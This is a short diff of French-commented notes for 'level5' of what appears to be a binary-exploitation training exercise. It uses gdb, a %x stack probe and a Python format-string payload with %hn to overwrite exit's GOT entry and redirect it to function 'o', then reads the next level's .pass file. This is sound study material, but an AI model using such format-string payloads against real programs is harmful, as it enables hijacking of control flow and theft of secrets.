@@ -1,0 +1,27 @@
+# Meme chose que l'exercice d'avant, sauf que on a pas de leave pour recuperer nos changements sur la stack.
+# Donc on va changer l'adresse du GOT dans 'exit'  pour le faire pointer vers notre fonction 'o'
+#
+# echo "test" > /tmp/file
+#
+# gdb ./leve5
+# > layout asm
+# > b *0x80484ff
+# > run < /tmp/file
+# > si
+# > x 0x8049838
+#
+# # On obtient nos 3 adresses.
+# # 0x080484a4 qui correspond a notre fonction 'o'
+# # 0x080483d6 est l'adresse que on va change, qui pointe vers l'instruction d'apres.
+# # 0x08049838 est l'adresse de l'adresse a changer.
+#
+# ./level5
+# > 0000 %x %x %x %x
+# >> 0000 200 b7fd1ac0 b7ff37d0 30303030 <<
+#
+# # Notre buffer est sur le 4e index.
+#
+# python -c "print('\x38\x98\x04\x08' + '%x' * 2 + '%33941x' + '%hn')" > /tmp/file
+#
+# cat /tmp/file - | ./level5
+# > cat /home/user/level6/.pass
